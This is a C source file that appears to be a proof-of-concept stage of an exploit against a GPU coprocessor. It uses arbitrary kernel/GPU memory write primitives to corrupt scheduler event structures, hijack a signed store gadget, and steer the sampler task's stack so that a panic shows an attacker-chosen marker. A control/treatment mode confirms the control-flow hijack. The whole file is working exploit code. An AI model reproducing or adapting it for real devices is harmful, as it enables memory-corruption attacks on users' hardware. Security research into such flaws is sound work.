#include "auth_call.h"
#include "gfx.h"
#include "offsets.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define EVENT_CURRENT       0x00ULL
#define EVENT_NEXT          0x04ULL
#define EVENT_SUBSCRIBERS   0x08ULL
#define EVENT_SUBSCRIBER    0x10ULL
#define EVENT_COUNT         0x18ULL
#define EVENT_CALLBACK      0x28ULL
#define EVENT_OBJECT        0x30ULL
#define EVENT_INDEX         0x38ULL
#define EVENT_NOTIFY        0x40ULL
#define SCHEDULER_PENDING   0x48ULL

static int arm(uint32_t marker)
{
    uint64_t store_base = GFX_SAMPLER_SP - 0x320008ULL;

    return gfx_write64(GFX_AUTH_OBJECT + 0x08, store_base) == 0 &&
        gfx_write64(GFX_SIGNED_STORE32_SLOT + 0x08,
                    GFX_AUTH_OBJECT) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_SUBSCRIBERS,
                    GFX_SIGNED_STORE32_SLOT) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_SUBSCRIBER,
                    UINT32_MAX) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_COUNT, 1) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_CALLBACK, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_OBJECT, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_INDEX, 0) == 0 &&
        gfx_write64(GFX_SCHEDULER_EVENT0 + EVENT_NOTIFY,
                    GFX_SCHEDULER_NOTIFY) == 0 &&
        gfx_write32(GFX_SCHEDULER_EVENT0 + EVENT_CURRENT,
                    marker) == 0 &&
        gfx_write32(GFX_SCHEDULER_EVENT0 + EVENT_NEXT,
                    marker) == 0 ? 0 : -1;
}

static void sync_output(void)
{
    fflush(stdout);
    fflush(stderr);
    (void)fsync(STDOUT_FILENO);
    (void)fsync(STDERR_FILENO);
}

int auth_call_run(int treatment)
{
    uint32_t marker = (arc4random() & 0x7fff0000U) | 0x4141U;
    uint64_t expected_far = (uint64_t)marker + 0x50ULL;

    printf("mode     %s\n", treatment ? "treatment" : "control");
    printf("path     kcall=0 physrw=0 kvtophys=0 rtbuddy=0 "
           "xnu_alias=0\n");
    printf("callback slot=0x%016llx target=0xfffffc000002c33c "
           "untouched=1\n", GFX_SIGNED_STORE32_SLOT);
    printf("witness  task=agx_sampler pc=0xfffffc00000331ac "
           "sp=0x%016llx far=0x%016llx\n",
           (uint64_t)marker, expected_far);

    if (arm(marker) != 0) {
        fputs("error: arm\n", stderr);
        return 1;
    }

    printf("armed    marker=0x%08x pending=%u direct_sp_write=0\n",
           marker, treatment ? 1U : 0U);
    sync_output();

    if (treatment &&
        gfx_write32(GFX_SCHEDULER_CORE + SCHEDULER_PENDING, 1) != 0) {
        fputs("error: pending\n", stderr);
        return 1;
    }

    usleep(20000);
    if (gfx_write32(GFX_SAMPLER_X20, 0) != 0) {
        fputs("error: sampler trigger\n", stderr);
        return 1;
    }

    if (!treatment) {
        sleep(10);
        printf("control  pass=no_matching_panic reboot_required=1\n");
        sync_output();
        return 0;
    }

    fputs("waiting  for matching panic\n", stdout);
    sync_output();
    sleep(30);
    fputs("treatment failure=no_matching_panic reboot_required=1\n",
          stderr);
    sync_output();
    return 1;
}
